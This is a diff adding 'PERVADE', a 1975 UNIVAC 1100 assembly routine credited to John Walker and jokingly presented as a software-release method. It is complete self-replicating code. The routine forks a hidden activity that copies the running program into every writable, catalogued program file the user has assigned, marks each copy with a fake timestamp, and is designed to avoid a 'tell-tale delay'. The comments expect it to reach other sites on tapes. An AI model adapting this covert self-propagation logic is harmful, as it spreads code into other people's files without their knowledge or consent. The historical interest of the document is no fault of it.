@@ -1,0 +1,431 @@
+.
+.
+.                            P E R V A D E
+.
+.                  A NEW MEANS OF RELEASING SOFTWARE
+.
+.
+.                                       JOHN WALKER   JANUARY 1975
+.
+.
+.         THIS PROGRAM IS A TOTALLY NEW WAY OF DISTRIBUTING VERSIONS OF
+.         SOFTWARE THROUGHOUT THE 1100 SERIES USER COMMUNITY.  PREVIOUS
+.         METHODS REQUIRED THE DELIBERATE AND PLANNED INTERCHANGE OF
+.         TAPES, CARD DECKS, OR OTHER TRANSFER MEDIA.  THE ADVENT OF
+.         'PERVADE' PERMITS SOFTWARE TO BE RELEASED IN SUCH A MANNER THAT
+.         IF SOMEONE CALLS YOU UP AND ASKS FOR A VERSION OF A PROCESSOR,
+.         VERY LIKELY YOU CAN TELL THEM THAT THEY ALREADY HAVE IT, MUCH
+.         TO THEIR OWN SURPRISE.
+.
+.         HERE IS HOW IT WORKS:
+.
+.         ANY PROGRAM WHICH WISHES TO PERVADE THE USER COMMUNITY SHOULD
+.         INSERT THE CALL:
+.
+.         LMJ       X11,PERVADE
+.
+.         AT THE START OF ITS CODE, AND THE CALL:
+.
+.         LMJ       X11,PVTERM
+.
+.         AT THE END OF CODE, JUST BEFORE THE FINAL ER EXIT$.  THE
+.         INITIAL CALL ON PERVADE WILL FORK OFF AN ACTIVITY TO DO
+.         THE ACTUAL PERVASION AND RETURN CONTROL IMMEDIATELY TO
+.         THE USER PROGRAM.  THE USER WILL GET HIS ORIGINAL ACTIVITY
+.         BACK.  THE PERVADE ACTIVITY WILL THEN SCAN THE PCT VIA PCT$
+.         AND EXAMINE THE PCT ITEMS FOR ALL FILES CURRENTLY ASSIGNED
+.         TO THE RUN.  IF A FILE IS CATALOGUED, READ AND WRITE ENABLED,
+.         AND AN INITIALISED PROGRAM FILE, IT IS CHECKED TO SEE
+.         WHETHER A COPY OF THE CURRENTLY EXECUTING ABSOLUTE EXISTS IN
+.         THE FILE.  IF NOT, IT COPIES THE CURRENT ABSOLUTE INTO THE
+.         FILE TO REMEDY THE SITUATION.  SOONER OR LATER, THE USER WILL
+.         NOTICE THAT A NEW ABSOLUTE HAS GOTTEN INTO HIS FILE, AND WILL
+.         PROBABLY EXECUTE IT TO SEE WHAT IT DOES.  IT WILL THEN, OF
+.         COURSE, COPY ITSELF INTO ALL THE NEW FILES HE HAS ASSIGNED
+.         AT THAT TIME.  BY SUCCESSIVE REPETITIONS, THE PROGRAM WILL,
+.         WELL, PERVADE.  NATURALLY IT WILL FIND ITSELF SOONER OR
+.         LATER ON A TAPE BOUND FOR ANOTHER SITE WHERE THE PROCESS
+.         WILL CONTINUE UNTIL THE PROGRAM HAS PERVADED THROUGHOUT THE
+.         USER COMMUNITY.
+.
+.         THE MULTI-ACTIVITY APPROACH PERMITS THE PROGRAM TO PERVADE
+.         UNBEKNOWNST TO THE USER.  THE FINAL CALL ON PVTERM STOPS
+.         IN-PROGRESS PERVASION, IF ANY, AND SHUTS DOWN THE PROCESSOR
+.         IMMEDIATELY SO NO TELL-TALE DELAY OCCURS.
+.
+.         WHEN AN ELEMENT IS ENTERED IN A USER FILE, THE DATE OF THE
+.         ORIGINAL ELEMENT WILL BE UNCHANGED, BUT THE TIME WILL BE
+.         CHANGED TO THE DISTINCTIVE TIME 25:14:19.  THIS PERMITS
+.         PERVADE TO TELL WHEN IT LOOKS IN A USER FILE THAT AN ELEMENT
+.         WITH THE SAME NAME AS THE RUNNING PROGRAM WAS PUT THERE
+.         PREVIOUSLY BY PERVADE.  IF IT WAS NOT, NO ACTION WILL BE
+.         TAKEN, LEST PERVADE DELETE A USER PROGRAM WITH THE SAME NAME.
+.         IF THE ELEMENT WAS INSERTED BY PERVADE, THOUGH, THE DATE
+.         OF THE ELEMENT IN THE USER FILE WILL BE COMPARED WITH THE
+.         DATE OF THE RUNNING PROGRAM, AND IF THE RUNNING PROGRAM IS
+.         MORE RECENT THAN THE COPY IN THE USER'S FILE, THE NEWER COPY
+.         WILL BE INSERTED IN THE USER FILE.  THIS PERMITS 'PERVASIVE
+.         INCREMENTAL RELEASES' OF SOFTWARE.
+.
+.
+.
+.
+.         THE TAG 'TALK' MAY BE SET NONZERO TO GENERATE DIAGNOSTIC
+.         OUTPUT DURING THE OPERATION OF PERVADE.
+.
+TALK      EQU       0                   TURN IT OFF
+.
+.         TIME IN SECONDS USED TO IDENTIFY PERVADE-INSERTED ELEMENTS.
+.
+TIMEFLAG  EQU       25*60*60+14*60+19   25:14:19
+.
+.
+          AXR$
+          DEFUNCT$
+          LIT$      2
+.
+.         PROC USED TO CHECK FOR FORCIBLE TERMINATION
+.
+P         PROC      0,2                 CHECK FOR TERMINATION OF MAIN PROGRAM
+YET*      NAME      0
+          TZ        PVSTOP              IS THE CEASE FLAG SET ?
+          J         PERVEX              YES.  GET OUT OF HERE
+          END
+.
+.         PROC TO LOAD REASON FOR IGNORING FILE IN TALK MODE
+.
+P         PROC      *1
+REASON*   NAME      0
+          ON        TALK
+          LR        R2,(LJSF$1 P(1,1))  LOAD REASON FOR SKIPPING FILE
+          OFF       TALK
+          END       .
+.
+.
+.         FIXED LOCATIONS IN THE PCT
+.
+EU        EQUF      0110                FILE NAME OF CURRENT PROGRAM
+KB        EQUF      0125                PROGRAM NAME
+KD        EQUF      0127                VERSION NAME
+PCTNAM    EQU       0241                FIRST PCT NAME TABLE
+.
+IOBUFL    EQU       224                 I/O BUFFER LENGTH
+.
+.
+$(1).
+PERVADE*  TS        PVCW.               LOCK PERVADE CONTROL STORAGE
+          TZ        PVBUSY              IS PERVADE ALREADY IN PROGRESS ?
+          J         PVIGN               YES.  IGNORE REDUNDANT CALL
+          LA,U      A0,1                LOAD A ONE
+          SA        A0,PVBUSY           MARK PERVADE IN PROGRESS
+          SZ,S1     PVCW                CLEAR LOCK ON CONTROL CELL
+          FORK$     PERVD1              SPAWN AN ACTIVITY TO DO THE SKULDUGGERY
+          J         0,X11               RETURN TO CALLER
+.
+PVIGN     SZ,S1     PVCW                CLEAR LOCK ON CONTROL CELLS
+          J         0,X11               RETURN TO CALLER
+.
+.
+.         MAIN PERVADE PROCESSING ACTIVITY
+.
+.         THIS ROUTINE SCANS THE PCT FILE ASSIGNMENT TABLES AND
+.         LOOKS FOR CATALOGUED PROGRAM FILES.  FOR EACH ONE FOUND,
+.         IT DOES A PFS$ TO LOOK FOR THE ABSOLUTE BEING EXECUTED
+.         BY THE USER IN THE USER'S FILE.  IF IT FINDS IT, OR THE
+.         FILE IS NOT A PROGRAM FILE, IT GIVES UP AND TRIES THE NEXT
+.         FILE.  IF IT DOES NOT FIND IT, IT COPIES THE ELEMENT INTO
+.         THE FILE AND INSERTS IT INTO THE TABLE OF CONTENTS.
+.
+PERVD1    PCT$,EU   PFR,2               GET INTERNAL NAME OF ABSOLUTE FILE
+          PCT$,KB   PFP+2,2             GET NAME OF ABSOLUTE ELEMENT
+          PCT$,KD   PFP+6,2             GET VERSION OF ABSOLUTE
+          DL        A0,PFR              LOAD SOURCE FILE NAME
+          DS        A0,IOR              SET FILE NAME IN I/O PACKET TO READ TEXT
+          DL        A0,PFP+2            LOAD NAME FROM PFI$ PACKET
+          DS        A0,PFR+2            SET IN PFS$ PACKET
+          DL        A0,PFP+6            LOAD VERSION FROM PFI$ PACKET
+          DS        A0,PFR+6            SET INTO PFS$ PACKET
+          PCT$,PCTNAM FILIST,62         RETRIEVE INITIAL FACILITY NAME ITEM
+          LA,U      A4,PCTNAM           LOAD OFFSET OF ORIGINAL BUFFER
+.
+PERVDFI   LX,U      X8,FILIST+1         LOAD POINTER TO FIRST FILE NAME
+          LR,S3     R3,FILIST           LOAD NUMBER OF FILES IN TABLE
+          J         PERVDFE             ENTER PERVADING LOOP
+.
+.         THIS CODE PROCESSES A FILE FROM THE FACILITY ITEM
+.
+PERVDFS   LA,H2     A1,2,X8             LOAD POINTER TO PCT ITEM
+          AA        A1,A4               MAKE ABSOLUTE PCT ADDRESS
+          LXI,U     A1,15               LOAD LENGTH OF PCT ITEM
+          LA,U      A0,PCTITM           LOAD PCT ITEM BUFFER
+          PCT$      .                   READ PCT ITEM INTO OUR BUFFER
+          YET       .                   CHECK FOR TERMINATION
+.
+.         WE NOW HAVE RETRIEVED THE PCT ITEM.  NOW WE SCAN IT TO SEE
+.         WHETHER THE FILE IS WORTH COPYING OURSELVES INTO.  IT MUST
+.         BE A CATALOGUED FILE, AND HAVE A FASTRAND MASS STORAGE TYPE.
+.         IF WE CAN GET AT THE ASSIGNMENT INFORMATION, WE SEE IF THE FILE
+.         HAS ENOUGH GRANULES TO BE A PROGRAM FILE AND WHETHER IT IS
+.         MARKED AS CHANGED.
+.
+          REASON    'EQTTYP'
+          LA        A0,PCFEQT           LOAD EQUIPMENT TYPE OF FILE
+          TG,U      A0,030              IS IT FASTRAND TYPE ?
+          TG,U      A0,037+1            ...OR SOMETHING ELSE ?
+          J         PERVDFN             YES.  SKIP THIS FILE
+          REASON    'INHIBT'
+          LA        A0,PCFRW            LOAD READ/WRITE INHIBIT BITS
+          TOP,U     A0,WRINHB           IS FILE WRITE PROTECTED ?
+          TEP,U     A0,RDINHB           OR READ PROTECTED ?
+          J         PERVDFN             YES.  SKIP THIS FILE
+          REASON    'WAD'
+          LA        A0,PCFFLG           LOAD FILE TYPE FLAGS
+          TEP,U     A0,FGWAD            IS FILE WORD-ADDRESSABLE ?
+          J         PERVDFN             YES.  IGNORE IT
+          LA        A0,PCFIND           LOAD INDICATORS FOR FILE
+          TEP,U     A0,EXPITM           IS ITEM IN EXPOOL ?
+          J         PVUSEF              YES.  CAN'T CHECK FURTHER
+          REASON    'TEMP'
+          LA        A0,PCFID1           LOAD FURTHER ASSIGNMENT INFO
+          TEP,U     A0,040              IS FILE CATALOGUED ?
+          J         PERVDFN             NO.  DON'T BOTHER COPYING TO TEMP FILE
+.         TEP,U     A0,020              HAS FILE BEEN CHANGED ?
+.         J         PERVDFN             NO.  DON'T COPY INTO IT
+          REASON    'TRKCNT'
+          LA        A0,PCFLTR           LOAD HIGHEST TRACK REFERENCED
+          TLE,U     A0,28               CAN IT BE A PROGRAM FILE ?
+          J         PERVDFN             NO.  DON'T BOTHER TRYING
+.
+.
+.         THIS FILE IS A CATALOGUED, FASTRAND-FORMAT FILE ASSIGNED WITH
+.         READ AND WRITE PERMISSION.  NOW DETERMINE FOR REAL WHETHER THE
+.         FILE IS AN INITIALISED PROGRAM FILE AND WHETHER WE'RE ALREADY
+.         COPIED HERE.
+.
+PVUSEF    DL        A0,,X8              LOAD INTERNAL NAME FOR FILE
+          DS        A0,PFP              SET IN PFS$ PACKET
+          DS        A0,IOW              SET IN WRITE I/O PACKET
+          DS        A0,IORCK            SET FILE NAME IN READ CHECK PACKET
+          REASON    'NO*PF*'
+          IOW$      IORCK               READ SECTOR ZERO OF FILE
+          TZ,S1     IORCK+3             NORMAL STATUS ON READ ?
+          J         PERVDFN             NO.  FILE IS NOT A PROGRAM FILE
+          LA        A0,IOBUF            LOAD FIRST WORD OF BUFFER
+          TE        A0,('**PF**')       INITIALISED PROGRAM FILE ?
+          J         PERVDFN             NO.  SKIP PFS$ CODE
+          YET       .                   CHECK FOR TERMINATION
+          SZ        PFP+11              SET FLAG FOR ELEMENT NOT FOUND IN FILE
+          PFS$      PFP                 LOOK FOR OURSELVES IN THIS FILE
+          YET       .                   CHECK FOR TERMINATION
+          REASON    'PFSERR'
+          TG,U      A2,2                ERROR STATUS FROM PFS$ ?
+          J         PERVDFN             YES.  DON'T MESS WITH A BAD FILE
+          JNZ       A2,PVLKU            PROCEED WITH COPY IF NO FIND
+.
+.         THE USER'S FILE CONTAINS AN ELEMENT WITH THE SAME NAME AS
+.         THE EXECUTING ABSOLUTE.  EXAMINE THE TIME OF CREATION TO
+.         SEE WHETHER THE ELEMENT WAS CREATED BY PERVADE (IF IT WAS,
+.         THE TIME PART OF THE TIME AND DATE WILL BE 25:14:19).  IF
+.         THE ELEMENT WAS NOT INSERTED BY PERVADE, DON'T TOUCH THE
+.         FILE.
+.
+          REASON    'SAMNAM'
+          LA,H1     A0,PFP+11           LOAD TIME OF ELEMENT CREATION
+          TE,U      A0,TIMEFLAG         WAS ELEMENT ENTERED BY PERVADE ?
+          J         PERVDFN             NO.  DON'T DESTROY USER ELEMENT
+.
+.         LOOK UP OUR SOURCE ABSOLUTE ELEMENT
+.
+PVLKU     TZ        PFR+11              HAVE WE ALREADY DONE LOOKUP ?
+          J         PVLKAR              YES.  DO ONLY ONCE PER PERVASION
+          PFS$      PFR                 LOOK FOR SOURCE ABSOLUTE IN FILE
+          JNZ       A2,PERVEX           EXIT IF WE CAN'T FIND OURSELVES
+.
+.         IF A PERVADE-CREATED ABSOLUTE WITH THE SAME NAME AS THE EXECUTING
+.         PROGRAM WAS FOUND IN THE USER FILE, COMPARE THE DATE OF CREATION
+.         TO SEE WHETHER A MORE RECENT CURRENTLY EXECUTING PROGRAM SHOULD
+.         REPLACE THE OLDER PROGRAM IN THE USER FILE.
+.
+PVLKAR    TNZ       PFP+11              WAS ELEMENT FOUND IN USER FILE ?
+          J         PVLKOK              NO.  DO SOMETHING ABOUT IT
+          REASON    'ALREDY'            INDICATE SAME VERSION IN FILE
+          LA,H2     A0,PFP+11           LOAD CREATION DATE FROM USER FILE
+          TNE,H2    A0,PFR+11           SAME AS DATE IN EXECUTING FILE ?
+          J         PERVDFN             YES.  SAME ABSOLUTE IN USER FILE
+          REASON    'NEWER'             INDICATE NEWER ABSOLUTE IN USER FILE
+          LA,S6     A0,PFP+11           LOAD USER FILE YEARS
+          MSI,U     A0,12               CONVERT TO MONTHS
+          AA,S4     A0,PFP+11           ADD MONTHS
+          MSI,U     A0,31               CONVERT TO DAYS
+          AA,S5     A0,PFP+11           ADD DAYS TO TOTAL
+          LA,S6     A1,PFR+11           LOAD YEARS FROM EXECUTING FILE
+          MSI,U     A1,12               CONVERT TO MONTHS
+          AA,S4     A1,PFR+11           ADD MONTHS
+          MSI,U     A1,31               CONVERT TO DAYS
+          AA,S5     A1,PFR+11           ADD DAYS
+          TG        A0,A1               IS USER FILE COPY MORE RECENT ?
+          J         PERVDFN             YES.  DON'T CLOBBER WITH OLDER COPY
+.
+PVLKOK    PFWL$     PFP                 GET NEXT WRITE ADDRESS IN USER FILE
+          YET       .                   CHECK FOR TERMINATION
+          REASON    'PFWL'
+          JNZ       A2,PERVDFN          SKIP IF WE CAN'T GET IT
+          SA        A1,PFP+10           SET WRITE ADDRESS AS FIRST ADDRESS
+          SA        A1,IOW+5            SET WRITE ADDRESS IN I/O PACKET
+.
+.         COPY ABSOLUTE TEXT TO USER FILE
+.
+          LA,H2     A5,PFR+9            LOAD TEXT LENGTH
+          MSI,U     A5,28               CONVERT TO WORDS
+          LA        A0,PFR+10           LOAD STARTING ADDRESS OF ELEMENT
+          SA        A0,IOR+5            SET READ ADDRESS FOR COPY
+PVRDBL    JZ        A5,PVDPFI           GO INSERT ELEMENT IF COPY DONE
+          LA        A0,A5               LOAD WORDS LEFT TO COPY
+          TG,U      A0,IOBUFL+1         TOO LONG FOR I/O BUFFER ?
+          LA,U      A0,IOBUFL           YES.  TRUNCATE I/O TO BUFFER LENGTH
+          SA,H1     A0,IOR+4            SET LENGTH TO READ FROM FILE
+          ANA       A5,A0               UPDATE LENGTH REMAINING TO READ
+          IOW$      IOR                 READ A TEXT BLOCK FROM SOURCE FILE
+          YET       .                   CHECK FOR TERMINATION
+          TZ,S1     IOR+3               READ ERROR ?
+          J         PERVEX              YES.  SKULK AWAY
+          LA        A0,IOR+5            LOAD READ ADDRESS
+          AA,U      A0,IOBUFL/28        INCREMENT READ ADDRESS
+          SA        A0,IOR+5            UPDATE NEXT READ ADDRESS
+          LA        A0,IOR+4            LOAD INPUT ACCESS WORD
+          SA        A0,IOW+4            SET AS OUTPUT ACCESS WORD
+          IOW$      IOW                 WRITE BLOCK TO USER'S FILE
+          YET       .                   CHECK FOR TERMINATION
+          REASON    'WR ERR'
+          TZ,S1     IOW+3               WAS WRITE COMPLETED SUCCESSFULLY ?
+          J         PERVDFN             NO.  GO TRY NEXT FILE
+          LA        A0,IOW+5            LOAD WRITE ADDRESS FROM I/O PACKET
+          AA,U      A0,IOBUFL/28        INCREMENT WRITE ADDRESS
+          SA        A0,IOW+5            UPDATE WRITE ADDRESS IN PACKET
+          J         PVRDBL              LOOP FOR ALL TEXT BLOCKS
+.
+.         INSERT THE ABSOLUTE ELEMENT IN THE USER'S FILE.
+.
+PVDPFI    LA,H1     A0,PFR+5            LOAD ABSOLUTE FLAGS OF ORIGINAL ELEMENT
+          SA,H1     A0,PFP+5            SET AS FLAGS OF ELEMENT TO BE ENTERED
+          DL        A0,PFR+8            LOAD LENGTH AND BANK BITS
+          DS        A0,PFP+8            SET AS SAME IN NEW ELEMENT
+          LA        A0,PFR+11           LOAD TIME AND DATE
+          LXI,U     A0,TIMEFLAG         LOAD IDENTIFYING TIME
+          SA        A0,PFP+11           COPY TO NEW ELEMENT
+          LA        A1,PFP+10           LOAD START ADDRESS OF ELEMENT
+          AA,H2     A1,PFP+9            ADD LENGTH OF ELEMENT TO GET NEXT WRITE
+ADDRESS
+          LNA,U     A0,PFP              LOAD ADDRESS OF PACKET
+          PFI$      .                   INSERT ELEMENT, UPDATE WRITE ADDRESS
+          YET       .                   CHECK FOR TERMINATION
+          ON        TALK
+          DL        A0,('GOTCHA !!   ') LOAD 'FILE PROCESSED' SENTINEL
+          DS        A0,IOBUF            SET MESSAGE IN I/O BUFFER
+          DL        A0,,X8              LOAD FILE NAME JUST GOTTEN
+          DS        A0,IOBUF+2          SET IN OUTPUT BUFFER
+          PRINT$    IOBUF,4             PRINT MESSAGE FOR FILE PROCESSED
+          J         PERVDFP             INDICATE FILE PROCESSED.  GET NEXT
+          OFF       TALK
+.
+.         RETURN HERE TO SELECT NEXT FILE FOR 'PROCESSING'
+.
+PERVDFN   .
+          ON        TALK
+          LA        A0,('SKIP: ')       LOAD 'SKIP' INDICATOR FOR FILE
+          SA        A0,IOBUF            SET MESSAGE IN BUFFER
+          DL        A0,,X8              LOAD FILE NAME FROM PCT BUFFER
+          DS        A0,IOBUF+1          SET FILE NAME IN PACKET
+          LA        A0,R2               LOAD REASON FOR SKIPPING FILE
+          LA        A1,('      ')       LOAD SPACES
+          DSC       A0,6                SHIFT A SPACE IN FRONT OF REASON
+          DS        A0,IOBUF+3          SET REASON IN MESSAGE
+          PRINT$    IOBUF,5             PRINT REASON FOR SKIPPING FILE
+          OFF       TALK
+PERVDFP   AX,U      X8,3                ADVANCE TO NEXT FILE IN PCT BUFFER
+PERVDFE   JGD       R3,PERVDFS          LOOK IF MORE REMAIN
+.
+.         LINK TO NEXT FACILITY ITEM IN THE PCT, IF ANY
+.
+          LA,H2     A1,FILIST           LOAD LINK TO NEXT ITEM
+          JZ        A1,PERVEX           EXIT IF THIS WAS THE LAST ITEM
+          AA        A4,A1               COMPUTE ADDRESS OF NEXT BUFFER
+          LA        A1,A4               LOAD ADDRESS FOR PCT$
+          LXI,U     A1,62               LOAD LENGTH OF BUFFER
+          LA,U      A0,FILIST           LOAD FILE TABLE BUFFER ADDRESS
+          PCT$      .                   READ BUFFER FROM THE PCT
+          J         PERVDFI             GO PROCESS THE NEW BUFFER
+.
+.
+.         ALL FILES HAVE BEEN PROCESSED OR FORCIBLE TERMINATION HAS
+.         BEEN INVOKED.  CLEAR THE BUSY FLAG AND EXIT.
+.
+PERVEX    SZ        PVBUSY              CLEAR THE BUSY FLAG
+          EXIT$     .                   TERMINATE THE PERVADE ACTIVITY
+.
+.
+.         TERMINATE PERVASION
+.
+.         THIS SUBROUTINE SHOULD BE CALLED BY THE USER BEFORE EXITING
+.         HIS PROGRAM.  IT SETS THE PERVADE TERMINATION FLAG AND IF
+.         THE MAIN PERVADE ACTIVITY IS STILL BUSY, WAITS FOR IT TO BE
+.         FORCIBLY TERMINATED.
+.
+PVTERM*   LA,U      A0,1                LOAD A ONE
+          SA        A0,PVSTOP           SET TERMINATION MODE
+PVWAIT    TNZ       PVBUSY              IS PERVADE STILL BUSY ?
+          J         0,X11               NO.  RETURN TO THE CALLER
+          TWAIT$    10                  WAIT FOR TEM MILLISECONDS
+          J         PVWAIT              AND TRY AGAIN
+.
+.
+$(2).
+.
+FILIST    RES       62                  PCT FACILITY ITEM BUFFER
+PCTITM    RES       15                  PCT ITEM BUFFER
+IOBUF     RES       IOBUFL              I/O BUFFER FOR COPYING TEXT
+.
+IOR       IO$PKT,R$ 'CSINTNAME$' IOBUFL,IOBUF 0
+IORCK     IO$PKT,R$ 'USER-FILE' 28,IOBUF 0
+IOW       IO$PKT,W$ 'USER-FILE' IOBUFL,IOBUF 0
+.
+.         PCT ITEM FORMAT
+.
+PCFEQT    EQUF      PCTITM+1,,S1        EQUIPMENT TYPE
+PCFFLG    EQUF      PCTITM+1,,S3        FACILITY FLAGS
+PCFRW     EQUF      PCTITM+2,,S2        READ/WRITE FLAGS
+PCFIND    EQUF      PCTITM+3,,S3        MODE INDICATORS
+PCFID1    EQUF      PCTITM+6,,S1        SPECIAL ITEM FLAGS
+PCFLTR    EQUF      PCTITM+012,,H1      HIGHEST TRACK REFERENCED
+.
+.         STATUS BITS FOR PCT ITEM
+.
+WRINHB    EQU       020                 WRITE INHIBITED ON FILE
+RDINHB    EQU       010                 READ INHIBITED ON FILE
+FGWAD     EQU       1                   WORD ADDRESSABLE MODE
+EXPITM    EQU       1                   EXPOOL ITEM EXISTS
+.
+.
+PFR       'CSINTNAME$'                   PFS$ PACKET TO SEARCH SOURCE FILE
+          'ELT-NAME'
+          *         0
+          *         6,0
+          'VERSION'
+          DO        4 , * 0
+.
+PFP       'USER-FILE'                    PFI$ PACKET TO INSERT IN USER FILE
+          'ELT-NAME'
+          *         0
+          *         6,0
+          'VERSION'
+          RES       4
+.
+.         CONTROL CELL
+.
+PVCW      EQUF      $                   TEST AND SET
+PVBUSY    EQUF      $,,S2               BUSY FLAG
+PVSTOP    EQUF      $,,S3               CEASE FLAG SET BY PVTERM
+          *         0
+.
+.
+          END
